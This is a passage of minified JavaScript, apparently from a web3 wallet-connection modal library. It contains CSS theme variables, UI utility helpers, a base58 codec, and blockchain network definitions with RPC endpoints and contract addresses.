          --wui-box-shadow-blue: color-mix(in srgb, var(--wui-color-accent-100) 20%, transparent);

          --wui-color-accent-100: color-mix(
            in srgb,
            var(--wui-color-accent-base-100) 100%,
            transparent
          );
          --wui-color-accent-090: color-mix(
            in srgb,
            var(--wui-color-accent-base-100) 90%,
            transparent
          );
          --wui-color-accent-080: color-mix(
            in srgb,
            var(--wui-color-accent-base-100) 80%,
            transparent
          );
          --wui-color-accent-glass-090: color-mix(
            in srgb,
            var(--wui-color-accent-base-100) 90%,
            transparent
          );
          --wui-color-accent-glass-080: color-mix(
            in srgb,
            var(--wui-color-accent-base-100) 80%,
            transparent
          );
          --wui-color-accent-glass-020: color-mix(
            in srgb,
            var(--wui-color-accent-base-100) 20%,
            transparent
          );
          --wui-color-accent-glass-015: color-mix(
            in srgb,
            var(--wui-color-accent-base-100) 15%,
            transparent
          );
          --wui-color-accent-glass-010: color-mix(
            in srgb,
            var(--wui-color-accent-base-100) 10%,
            transparent
          );
          --wui-color-accent-glass-005: color-mix(
            in srgb,
            var(--wui-color-accent-base-100) 5%,
            transparent
          );
          --wui-color-accent-002: color-mix(
            in srgb,
            var(--wui-color-accent-base-100) 2%,
            transparent
          );

          --wui-color-fg-100: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-fg-100)
          );
          --wui-color-fg-125: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-fg-125)
          );
          --wui-color-fg-150: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-fg-150)
          );
          --wui-color-fg-175: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-fg-175)
          );
          --wui-color-fg-200: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-fg-200)
          );
          --wui-color-fg-225: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-fg-225)
          );
          --wui-color-fg-250: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-fg-250)
          );
          --wui-color-fg-275: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-fg-275)
          );
          --wui-color-fg-300: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-fg-300)
          );
          --wui-color-fg-325: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-fg-325)
          );
          --wui-color-fg-350: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-fg-350)
          );

          --wui-color-bg-100: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-bg-100)
          );
          --wui-color-bg-125: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-bg-125)
          );
          --wui-color-bg-150: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-bg-150)
          );
          --wui-color-bg-175: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-bg-175)
          );
          --wui-color-bg-200: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-bg-200)
          );
          --wui-color-bg-225: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-bg-225)
          );
          --wui-color-bg-250: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-bg-250)
          );
          --wui-color-bg-275: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-bg-275)
          );
          --wui-color-bg-300: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-bg-300)
          );
          --wui-color-bg-325: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-bg-325)
          );
          --wui-color-bg-350: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-bg-350)
          );

          --wui-color-success-100: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-success-base-100)
          );
          --wui-color-success-125: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-success-base-125)
          );

          --wui-color-warning-100: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-warning-base-100)
          );

          --wui-color-error-100: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-error-base-100)
          );
          --wui-color-blue-100: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-blue-base-100)
          );
          --wui-color-blue-90: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-blue-base-90)
          );
          --wui-color-error-125: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-error-base-125)
          );

          --wui-icon-box-bg-error-100: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-icon-box-bg-error-base-100)
          );
          --wui-icon-box-bg-accent-100: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-icon-box-bg-blue-base-100)
          );
          --wui-icon-box-bg-success-100: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-icon-box-bg-success-base-100)
          );
          --wui-icon-box-bg-inverse-100: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-icon-box-bg-inverse-base-100)
          );

          --wui-all-wallets-bg-100: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-all-wallets-bg-100)
          );

          --wui-avatar-border: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-avatar-border-base)
          );

          --wui-thumbnail-border: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-thumbnail-border-base)
          );

          --wui-wallet-button-bg: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-wallet-button-bg-base)
          );
        }
      }
    `,light:Ae`
      :root {
        --w3m-color-mix: ${_n((t==null?void 0:t["--w3m-color-mix"])||"#fff")};
        --w3m-accent: ${_n(Ro(t,"dark")["--w3m-accent"])};
        --w3m-default: #fff;

        --wui-color-modal-bg-base: ${_n(Ro(t,"dark")["--w3m-background"])};
        --wui-color-accent-base-100: var(--w3m-accent);

        --wui-color-blueberry-100: hsla(230, 100%, 67%, 1);
        --wui-color-blueberry-090: hsla(231, 76%, 61%, 1);
        --wui-color-blueberry-080: hsla(230, 59%, 55%, 1);
        --wui-color-blueberry-050: hsla(231, 100%, 70%, 0.1);

        --wui-color-fg-100: #e4e7e7;
        --wui-color-fg-125: #d0d5d5;
        --wui-color-fg-150: #a8b1b1;
        --wui-color-fg-175: #a8b0b0;
        --wui-color-fg-200: #949e9e;
        --wui-color-fg-225: #868f8f;
        --wui-color-fg-250: #788080;
        --wui-color-fg-275: #788181;
        --wui-color-fg-300: #6e7777;
        --wui-color-fg-325: #9a9a9a;
        --wui-color-fg-350: #363636;

        --wui-color-bg-100: #141414;
        --wui-color-bg-125: #191a1a;
        --wui-color-bg-150: #1e1f1f;
        --wui-color-bg-175: #222525;
        --wui-color-bg-200: #272a2a;
        --wui-color-bg-225: #2c3030;
        --wui-color-bg-250: #313535;
        --wui-color-bg-275: #363b3b;
        --wui-color-bg-300: #3b4040;
        --wui-color-bg-325: #252525;
        --wui-color-bg-350: #ffffff;

        --wui-color-success-base-100: #26d962;
        --wui-color-success-base-125: #30a46b;

        --wui-color-warning-base-100: #f3a13f;

        --wui-color-error-base-100: #f25a67;
        --wui-color-error-base-125: #df4a34;

        --wui-color-blue-base-100: rgba(102, 125, 255, 1);
        --wui-color-blue-base-90: rgba(102, 125, 255, 0.9);

        --wui-color-success-glass-001: rgba(38, 217, 98, 0.01);
        --wui-color-success-glass-002: rgba(38, 217, 98, 0.02);
        --wui-color-success-glass-005: rgba(38, 217, 98, 0.05);
        --wui-color-success-glass-010: rgba(38, 217, 98, 0.1);
        --wui-color-success-glass-015: rgba(38, 217, 98, 0.15);
        --wui-color-success-glass-020: rgba(38, 217, 98, 0.2);
        --wui-color-success-glass-025: rgba(38, 217, 98, 0.25);
        --wui-color-success-glass-030: rgba(38, 217, 98, 0.3);
        --wui-color-success-glass-060: rgba(38, 217, 98, 0.6);
        --wui-color-success-glass-080: rgba(38, 217, 98, 0.8);

        --wui-color-success-glass-reown-020: rgba(48, 164, 107, 0.2);

        --wui-color-warning-glass-reown-020: rgba(243, 161, 63, 0.2);

        --wui-color-error-glass-001: rgba(242, 90, 103, 0.01);
        --wui-color-error-glass-002: rgba(242, 90, 103, 0.02);
        --wui-color-error-glass-005: rgba(242, 90, 103, 0.05);
        --wui-color-error-glass-010: rgba(242, 90, 103, 0.1);
        --wui-color-error-glass-015: rgba(242, 90, 103, 0.15);
        --wui-color-error-glass-020: rgba(242, 90, 103, 0.2);
        --wui-color-error-glass-025: rgba(242, 90, 103, 0.25);
        --wui-color-error-glass-030: rgba(242, 90, 103, 0.3);
        --wui-color-error-glass-060: rgba(242, 90, 103, 0.6);
        --wui-color-error-glass-080: rgba(242, 90, 103, 0.8);

        --wui-color-error-glass-reown-020: rgba(223, 74, 52, 0.2);

        --wui-color-gray-glass-001: rgba(255, 255, 255, 0.01);
        --wui-color-gray-glass-002: rgba(255, 255, 255, 0.02);
        --wui-color-gray-glass-005: rgba(255, 255, 255, 0.05);
        --wui-color-gray-glass-010: rgba(255, 255, 255, 0.1);
        --wui-color-gray-glass-015: rgba(255, 255, 255, 0.15);
        --wui-color-gray-glass-020: rgba(255, 255, 255, 0.2);
        --wui-color-gray-glass-025: rgba(255, 255, 255, 0.25);
        --wui-color-gray-glass-030: rgba(255, 255, 255, 0.3);
        --wui-color-gray-glass-060: rgba(255, 255, 255, 0.6);
        --wui-color-gray-glass-080: rgba(255, 255, 255, 0.8);
        --wui-color-gray-glass-090: rgba(255, 255, 255, 0.9);

        --wui-color-dark-glass-100: rgba(42, 42, 42, 1);

        --wui-icon-box-bg-error-base-100: #3c2426;
        --wui-icon-box-bg-blue-base-100: #20303f;
        --wui-icon-box-bg-success-base-100: #1f3a28;
        --wui-icon-box-bg-inverse-base-100: #243240;

        --wui-all-wallets-bg-100: #222b35;

        --wui-avatar-border-base: #252525;

        --wui-thumbnail-border-base: #252525;

        --wui-wallet-button-bg-base: var(--wui-color-bg-125);

        --w3m-card-embedded-shadow-color: rgb(17 17 18 / 25%);
      }
    `,dark:Ae`
      :root {
        --w3m-color-mix: ${_n((t==null?void 0:t["--w3m-color-mix"])||"#000")};
        --w3m-accent: ${_n(Ro(t,"light")["--w3m-accent"])};
        --w3m-default: #000;

        --wui-color-modal-bg-base: ${_n(Ro(t,"light")["--w3m-background"])};
        --wui-color-accent-base-100: var(--w3m-accent);

        --wui-color-blueberry-100: hsla(231, 100%, 70%, 1);
        --wui-color-blueberry-090: hsla(231, 97%, 72%, 1);
        --wui-color-blueberry-080: hsla(231, 92%, 74%, 1);

        --wui-color-fg-100: #141414;
        --wui-color-fg-125: #2d3131;
        --wui-color-fg-150: #474d4d;
        --wui-color-fg-175: #636d6d;
        --wui-color-fg-200: #798686;
        --wui-color-fg-225: #828f8f;
        --wui-color-fg-250: #8b9797;
        --wui-color-fg-275: #95a0a0;
        --wui-color-fg-300: #9ea9a9;
        --wui-color-fg-325: #9a9a9a;
        --wui-color-fg-350: #d0d0d0;

        --wui-color-bg-100: #ffffff;
        --wui-color-bg-125: #f5fafa;
        --wui-color-bg-150: #f3f8f8;
        --wui-color-bg-175: #eef4f4;
        --wui-color-bg-200: #eaf1f1;
        --wui-color-bg-225: #e5eded;
        --wui-color-bg-250: #e1e9e9;
        --wui-color-bg-275: #dce7e7;
        --wui-color-bg-300: #d8e3e3;
        --wui-color-bg-325: #f3f3f3;
        --wui-color-bg-350: #202020;

        --wui-color-success-base-100: #26b562;
        --wui-color-success-base-125: #30a46b;

        --wui-color-warning-base-100: #f3a13f;

        --wui-color-error-base-100: #f05142;
        --wui-color-error-base-125: #df4a34;

        --wui-color-blue-base-100: rgba(102, 125, 255, 1);
        --wui-color-blue-base-90: rgba(102, 125, 255, 0.9);

        --wui-color-success-glass-001: rgba(38, 181, 98, 0.01);
        --wui-color-success-glass-002: rgba(38, 181, 98, 0.02);
        --wui-color-success-glass-005: rgba(38, 181, 98, 0.05);
        --wui-color-success-glass-010: rgba(38, 181, 98, 0.1);
        --wui-color-success-glass-015: rgba(38, 181, 98, 0.15);
        --wui-color-success-glass-020: rgba(38, 181, 98, 0.2);
        --wui-color-success-glass-025: rgba(38, 181, 98, 0.25);
        --wui-color-success-glass-030: rgba(38, 181, 98, 0.3);
        --wui-color-success-glass-060: rgba(38, 181, 98, 0.6);
        --wui-color-success-glass-080: rgba(38, 181, 98, 0.8);

        --wui-color-success-glass-reown-020: rgba(48, 164, 107, 0.2);

        --wui-color-warning-glass-reown-020: rgba(243, 161, 63, 0.2);

        --wui-color-error-glass-001: rgba(240, 81, 66, 0.01);
        --wui-color-error-glass-002: rgba(240, 81, 66, 0.02);
        --wui-color-error-glass-005: rgba(240, 81, 66, 0.05);
        --wui-color-error-glass-010: rgba(240, 81, 66, 0.1);
        --wui-color-error-glass-015: rgba(240, 81, 66, 0.15);
        --wui-color-error-glass-020: rgba(240, 81, 66, 0.2);
        --wui-color-error-glass-025: rgba(240, 81, 66, 0.25);
        --wui-color-error-glass-030: rgba(240, 81, 66, 0.3);
        --wui-color-error-glass-060: rgba(240, 81, 66, 0.6);
        --wui-color-error-glass-080: rgba(240, 81, 66, 0.8);

        --wui-color-error-glass-reown-020: rgba(223, 74, 52, 0.2);

        --wui-icon-box-bg-error-base-100: #f4dfdd;
        --wui-icon-box-bg-blue-base-100: #d9ecfb;
        --wui-icon-box-bg-success-base-100: #daf0e4;
        --wui-icon-box-bg-inverse-base-100: #dcecfc;

        --wui-all-wallets-bg-100: #e8f1fa;

        --wui-avatar-border-base: #f3f4f4;

        --wui-thumbnail-border-base: #eaefef;

        --wui-wallet-button-bg-base: var(--wui-color-bg-125);

        --wui-color-gray-glass-001: rgba(0, 0, 0, 0.01);
        --wui-color-gray-glass-002: rgba(0, 0, 0, 0.02);
        --wui-color-gray-glass-005: rgba(0, 0, 0, 0.05);
        --wui-color-gray-glass-010: rgba(0, 0, 0, 0.1);
        --wui-color-gray-glass-015: rgba(0, 0, 0, 0.15);
        --wui-color-gray-glass-020: rgba(0, 0, 0, 0.2);
        --wui-color-gray-glass-025: rgba(0, 0, 0, 0.25);
        --wui-color-gray-glass-030: rgba(0, 0, 0, 0.3);
        --wui-color-gray-glass-060: rgba(0, 0, 0, 0.6);
        --wui-color-gray-glass-080: rgba(0, 0, 0, 0.8);
        --wui-color-gray-glass-090: rgba(0, 0, 0, 0.9);

        --wui-color-dark-glass-100: rgba(233, 233, 233, 1);

        --w3m-card-embedded-shadow-color: rgb(224 225 233 / 25%);
      }
    `}}const Qe=Ae`
  *,
  *::after,
  *::before,
  :host {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
    font-style: normal;
    text-rendering: optimizeSpeed;
    -webkit-font-smoothing: antialiased;
    -moz-osx-font-smoothing: grayscale;
    -webkit-tap-highlight-color: transparent;
    font-family: var(--wui-font-family);
    backface-visibility: hidden;
  }
`,hr=Ae`
  button,
  a {
    cursor: pointer;
    display: flex;
    justify-content: center;
    align-items: center;
    position: relative;
    transition:
      color var(--wui-duration-lg) var(--wui-ease-out-power-1),
      background-color var(--wui-duration-lg) var(--wui-ease-out-power-1),
      border var(--wui-duration-lg) var(--wui-ease-out-power-1),
      border-radius var(--wui-duration-lg) var(--wui-ease-out-power-1),
      box-shadow var(--wui-duration-lg) var(--wui-ease-out-power-1);
    will-change: background-color, color, border, box-shadow, border-radius;
    outline: none;
    border: none;
    column-gap: var(--wui-spacing-3xs);
    background-color: transparent;
    text-decoration: none;
  }

  wui-flex {
    transition: border-radius var(--wui-duration-lg) var(--wui-ease-out-power-1);
    will-change: border-radius;
  }

  button:disabled > wui-wallet-image,
  button:disabled > wui-all-wallets-image,
  button:disabled > wui-network-image,
  button:disabled > wui-image,
  button:disabled > wui-transaction-visual,
  button:disabled > wui-logo {
    filter: grayscale(1);
  }

  @media (hover: hover) and (pointer: fine) {
    button:hover:enabled {
      background-color: var(--wui-color-gray-glass-005);
    }

    button:active:enabled {
      background-color: var(--wui-color-gray-glass-010);
    }
  }

  button:disabled > wui-icon-box {
    opacity: 0.5;
  }

  input {
    border: none;
    outline: none;
    appearance: none;
  }
`,ip=Ae`
  .wui-color-inherit {
    color: var(--wui-color-inherit);
  }

  .wui-color-accent-100 {
    color: var(--wui-color-accent-100);
  }

  .wui-color-error-100 {
    color: var(--wui-color-error-100);
  }

  .wui-color-blue-100 {
    color: var(--wui-color-blue-100);
  }

  .wui-color-blue-90 {
    color: var(--wui-color-blue-90);
  }

  .wui-color-error-125 {
    color: var(--wui-color-error-125);
  }

  .wui-color-success-100 {
    color: var(--wui-color-success-100);
  }

  .wui-color-success-125 {
    color: var(--wui-color-success-125);
  }

  .wui-color-inverse-100 {
    color: var(--wui-color-inverse-100);
  }

  .wui-color-inverse-000 {
    color: var(--wui-color-inverse-000);
  }

  .wui-color-fg-100 {
    color: var(--wui-color-fg-100);
  }

  .wui-color-fg-200 {
    color: var(--wui-color-fg-200);
  }

  .wui-color-fg-300 {
    color: var(--wui-color-fg-300);
  }

  .wui-color-fg-325 {
    color: var(--wui-color-fg-325);
  }

  .wui-color-fg-350 {
    color: var(--wui-color-fg-350);
  }

  .wui-bg-color-inherit {
    background-color: var(--wui-color-inherit);
  }

  .wui-bg-color-blue-100 {
    background-color: var(--wui-color-accent-100);
  }

  .wui-bg-color-error-100 {
    background-color: var(--wui-color-error-100);
  }

  .wui-bg-color-error-125 {
    background-color: var(--wui-color-error-125);
  }

  .wui-bg-color-success-100 {
    background-color: var(--wui-color-success-100);
  }

  .wui-bg-color-success-125 {
    background-color: var(--wui-color-success-100);
  }

  .wui-bg-color-inverse-100 {
    background-color: var(--wui-color-inverse-100);
  }

  .wui-bg-color-inverse-000 {
    background-color: var(--wui-color-inverse-000);
  }

  .wui-bg-color-fg-100 {
    background-color: var(--wui-color-fg-100);
  }

  .wui-bg-color-fg-200 {
    background-color: var(--wui-color-fg-200);
  }

  .wui-bg-color-fg-300 {
    background-color: var(--wui-color-fg-300);
  }

  .wui-color-fg-325 {
    background-color: var(--wui-color-fg-325);
  }

  .wui-color-fg-350 {
    background-color: var(--wui-color-fg-350);
  }
`,Wt={getSpacingStyles(t,e){if(Array.isArray(t))return t[e]?`var(--wui-spacing-${t[e]})`:void 0;if(typeof t=="string")return`var(--wui-spacing-${t})`},getFormattedDate(t){return new Intl.DateTimeFormat("en-US",{month:"short",day:"numeric"}).format(t)},getHostName(t){try{return new URL(t).hostname}catch{return""}},getTruncateString({string:t,charsStart:e,charsEnd:r,truncate:n}){return t.length<=e+r?t:n==="end"?`${t.substring(0,e)}...`:n==="start"?`...${t.substring(t.length-r)}`:`${t.substring(0,Math.floor(e))}...${t.substring(t.length-Math.floor(r))}`},generateAvatarColors(t){const e=t.toLowerCase().replace(/^0x/iu,"").replace(/[^a-f0-9]/gu,"").substring(0,6).padEnd(6,"0"),r=this.hexToRgb(e),n=getComputedStyle(document.documentElement).getPropertyValue("--w3m-border-radius-master"),i=100-3*Number(n==null?void 0:n.replace("px","")),s=`${i}% ${i}% at 65% 40%`,o=[];for(let a=0;a<5;a+=1){const c=this.tintColor(r,.15*a);o.push(`rgb(${c[0]}, ${c[1]}, ${c[2]})`)}return`
    --local-color-1: ${o[0]};
    --local-color-2: ${o[1]};
    --local-color-3: ${o[2]};
    --local-color-4: ${o[3]};
    --local-color-5: ${o[4]};
    --local-radial-circle: ${s}
   `},hexToRgb(t){const e=parseInt(t,16),r=e>>16&255,n=e>>8&255,i=e&255;return[r,n,i]},tintColor(t,e){const[r,n,i]=t,s=Math.round(r+(255-r)*e),o=Math.round(n+(255-n)*e),a=Math.round(i+(255-i)*e);return[s,o,a]},isNumber(t){return/^[0-9]+$/u.test(t)},getColorTheme(t){var e;return t||(typeof window<"u"&&window.matchMedia?(e=window.matchMedia("(prefers-color-scheme: dark)"))!=null&&e.matches?"dark":"light":"dark")},splitBalance(t){const e=t.split(".");return e.length===2?[e[0],e[1]]:["0","00"]},roundNumber(t,e,r){return t.toString().length>=e?Number(t).toFixed(r):t},formatNumberToLocalString(t,e=2){return t===void 0?"0.00":typeof t=="number"?t.toLocaleString("en-US",{maximumFractionDigits:e,minimumFractionDigits:e}):parseFloat(t).toLocaleString("en-US",{maximumFractionDigits:e,minimumFractionDigits:e})}};function MW(t,e){const{kind:r,elements:n}=e;return{kind:r,elements:n,finisher(i){customElements.get(t)||customElements.define(t,i)}}}function FW(t,e){return customElements.get(t)||customElements.define(t,e),e}function he(t){return function(e){return typeof e=="function"?FW(t,e):MW(t,e)}}function zW(t){if(t.length>=255)throw new TypeError("Alphabet too long");const e=new Uint8Array(256);for(let l=0;l<e.length;l++)e[l]=255;for(let l=0;l<t.length;l++){const u=t.charAt(l),h=u.charCodeAt(0);if(e[h]!==255)throw new TypeError(u+" is ambiguous");e[h]=l}const r=t.length,n=t.charAt(0),i=Math.log(r)/Math.log(256),s=Math.log(256)/Math.log(r);function o(l){if(l instanceof Uint8Array||(ArrayBuffer.isView(l)?l=new Uint8Array(l.buffer,l.byteOffset,l.byteLength):Array.isArray(l)&&(l=Uint8Array.from(l))),!(l instanceof Uint8Array))throw new TypeError("Expected Uint8Array");if(l.length===0)return"";let u=0,h=0,d=0;const f=l.length;for(;d!==f&&l[d]===0;)d++,u++;const g=(f-d)*s+1>>>0,p=new Uint8Array(g);for(;d!==f;){let b=l[d],v=0;for(let x=g-1;(b!==0||v<h)&&x!==-1;x--,v++)b+=256*p[x]>>>0,p[x]=b%r>>>0,b=b/r>>>0;if(b!==0)throw new Error("Non-zero carry");h=v,d++}let w=g-h;for(;w!==g&&p[w]===0;)w++;let m=n.repeat(u);for(;w<g;++w)m+=t.charAt(p[w]);return m}function a(l){if(typeof l!="string")throw new TypeError("Expected String");if(l.length===0)return new Uint8Array;let u=0,h=0,d=0;for(;l[u]===n;)h++,u++;const f=(l.length-u)*i+1>>>0,g=new Uint8Array(f);for(;u<l.length;){const b=l.charCodeAt(u);if(b>255)return;let v=e[b];if(v===255)return;let x=0;for(let I=f-1;(v!==0||x<d)&&I!==-1;I--,x++)v+=r*g[I]>>>0,g[I]=v%256>>>0,v=v/256>>>0;if(v!==0)throw new Error("Non-zero carry");d=x,u++}let p=f-d;for(;p!==f&&g[p]===0;)p++;const w=new Uint8Array(h+(f-p));let m=h;for(;p!==f;)w[m++]=g[p++];return w}function c(l){const u=a(l);if(u)return u;throw new Error("Non-base"+r+" character")}return{encode:o,decodeUnsafe:a,decode:c}}var jW="123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz",HW=zW(jW);const zp={ERROR_CODE_UNRECOGNIZED_CHAIN_ID:4902,ERROR_CODE_DEFAULT:5e3,ERROR_INVALID_CHAIN_ID:32603},N9={gasPriceOracle:{address:"0x420000000000000000000000000000000000000F"},l1Block:{address:"0x4200000000000000000000000000000000000015"},l2CrossDomainMessenger:{address:"0x4200000000000000000000000000000000000007"},l2Erc721Bridge:{address:"0x4200000000000000000000000000000000000014"},l2StandardBridge:{address:"0x4200000000000000000000000000000000000010"},l2ToL1MessagePasser:{address:"0x4200000000000000000000000000000000000016"}},qW={block:TH({format(t){var e;return{transactions:(e=t.transactions)==null?void 0:e.map(r=>{if(typeof r=="string")return r;const n=a2(r);return n.typeHex==="0x7e"&&(n.isSystemTx=r.isSystemTx,n.mint=r.mint?Cl(r.mint):void 0,n.sourceHash=r.sourceHash,n.type="deposit"),n}),stateRoot:t.stateRoot}}}),transaction:kH({format(t){const e={};return t.type==="0x7e"&&(e.isSystemTx=t.isSystemTx,e.mint=t.mint?Cl(t.mint):void 0,e.sourceHash=t.sourceHash,e.type="deposit"),e}}),transactionReceipt:Eq({format(t){return{l1GasPrice:t.l1GasPrice?Cl(t.l1GasPrice):null,l1GasUsed:t.l1GasUsed?Cl(t.l1GasUsed):null,l1Fee:t.l1Fee?Cl(t.l1Fee):null,l1FeeScalar:t.l1FeeScalar?Number(t.l1FeeScalar):null}}})};function VW(t,e){return KW(t)?GW(t):dq(t,e)}const WW={transaction:VW};function GW(t){ZW(t);const{sourceHash:e,data:r,from:n,gas:i,isSystemTx:s,mint:o,to:a,value:c}=t,l=[e,n,a??"0x",o?Oe(o):"0x",c?Oe(c):"0x",i?Oe(i):"0x",s?"0x1":"0x",r??"0x"];return Xf(["0x7e",gh(l)])}function KW(t){return t.type==="deposit"||typeof t.sourceHash<"u"}function ZW(t){const{from:e,to:r}=t;if(e&&!Ic(e))throw new xc({address:e});if(r&&!Ic(r))throw new xc({address:r})}const ye={contracts:N9,formatters:qW,serializers:WW};({...ye.contracts});({...ye.contracts});({...ye.contracts});({...ye.contracts});({...ye.contracts},di({id:53456,name:"BirdLayer",nativeCurrency:{decimals:18,name:"Ether",symbol:"ETH"},rpcUrls:{default:{http:["https://rpc.birdlayer.xyz","https://rpc1.birdlayer.xyz"],webSocket:["wss://rpc.birdlayer.xyz/ws"]}},blockExplorers:{default:{name:"BirdLayer Explorer",url:"https://scan.birdlayer.xyz"}}}));({...ye.contracts});const Vw=1;di({...ye,id:60808,name:"BOB",nativeCurrency:{decimals:18,name:"ETH",symbol:"ETH"},rpcUrls:{default:{http:["https://rpc.gobob.xyz"],webSocket:["wss://rpc.gobob.xyz"]}},blockExplorers:{default:{name:"BOB Explorer",url:"https://explorer.gobob.xyz"}},contracts:{...ye.contracts,multicall3:{address:"0xcA11bde05977b3631167028862bE2a173976CA11",blockCreated:23131},l2OutputOracle:{[Vw]:{address:"0xdDa53E23f8a32640b04D7256e651C1db98dB11C1",blockCreated:4462615}},portal:{[Vw]:{address:"0x8AdeE124447435fE03e3CD24dF3f4cAE32E65a3E",blockCreated:4462615}}},sourceId:Vw});const Ww=11155111;di({...ye,id:808813,name:"BOB Sepolia",nativeCurrency:{decimals:18,name:"ETH",symbol:"ETH"},rpcUrls:{default:{http:["https://bob-sepolia.rpc.gobob.xyz"],webSocket:["wss://bob-sepolia.rpc.gobob.xyz"]}},blockExplorers:{default:{name:"BOB Sepolia Explorer",url:"https://bob-sepolia.explorer.gobob.xyz"}},contracts:{...ye.contracts,multicall3:{address:"0xcA11bde05977b3631167028862bE2a173976CA11",blockCreated:35677},l2OutputOracle:{[Ww]:{address:"0x14D0069452b4AE2b250B395b8adAb771E4267d2f",blockCreated:4462615}},portal:{[Ww]:{address:"0x867B1Aa872b9C8cB5E9F7755feDC45BB24Ad0ae4",blockCreated:4462615}}},testnet:!0,sourceId:Ww});const JW={contracts:N9};({...JW.contracts},di({id:44,name:"Crab Network",nativeCurrency:{decimals:18,name:"Crab Network Native Token",symbol:"CRAB"},rpcUrls:{default:{http:["https://crab-rpc.darwinia.network"],webSocket:["wss://crab-rpc.darwinia.network"]}},blockExplorers:{default:{name:"Blockscout",url:"https://crab-scan.darwinia.network"}},contracts:{multicall3:{address:"0xca11bde05977b3631167028862be2a173976ca11",blockCreated:3032593}}})),di({id:66665,name:"Creator",nativeCurrency:{decimals:18,name:"Ether",symbol:"ETH"},rpcUrls:{default:{http:["https://rpc.creatorchain.io"]}},blockExplorers:{default:{name:"Explorer",url:"https://explorer.creatorchain.io"}},contracts:{multicall3:{address:"0xcA11bde05977b3631167028862bE2a173976CA11"}},testnet:!0}),{...ye.contracts},{...ye.contracts},di({id:53457,name:"DODOchain Testnet",nativeCurrency:{decimals:18,name:"DODO",symbol:"DODO"},rpcUrls:{default:{http:["https://dodochain-testnet.alt.technology"],webSocket:["wss://dodochain-testnet.alt.technology/ws"]}},blockExplorers:{default:{name:"DODOchain Testnet (Sepolia) Explorer",url:"https://testnet-scan.dodochain.com"}},testnet:!0});({...ye.contracts});({...ye.contracts});({...ye.contracts});({...ye.contracts});({...ye.contracts});const QW=11155111;di({...ye,id:3397901,network:"funkiSepolia",name:"Funki Sepolia Sandbox",nativeCurrency:{name:"Ether",symbol:"ETH",decimals:18},rpcUrls:{default:{http:["https://funki-testnet.alt.technology"]}},blockExplorers:{default:{name:"Funki Sepolia Sandbox Explorer",url:"https://sepolia-sandbox.funkichain.com/"}},testnet:!0,contracts:{...ye.contracts,multicall3:{address:"0xca11bde05977b3631167028862be2a173976ca11",blockCreated:1620204}},sourceId:QW});const jp=17e3;di({...ye,name:"Garnet 